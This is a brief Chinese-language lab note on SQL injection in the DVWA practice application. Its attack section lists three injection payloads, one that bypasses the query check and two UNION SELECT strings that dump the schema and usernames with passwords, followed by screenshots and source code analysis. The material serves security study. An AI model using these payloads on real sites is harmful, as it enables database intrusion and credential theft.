# 網站漏洞測試(2).Sql injection


## 正常功能
![DVWA_SQLi_1.png](DVWA_SQLi_1.png)

## SQLi攻擊  == > 
- 1' or '111'='111
- %' UNION SELECT table_name,column_name FROM information_schema.columns
- %' UNION SELECT user, password FROM users

![DVWA_SQLi_2.png](DVWA_SQLi_2.png)

## 原始碼分析 1
![DVWA_SQLi_3.png](DVWA_SQLi_3.png)

## 原始碼分析 2
![DVWA_SQLi_4.png](DVWA_SQLi_4.png)
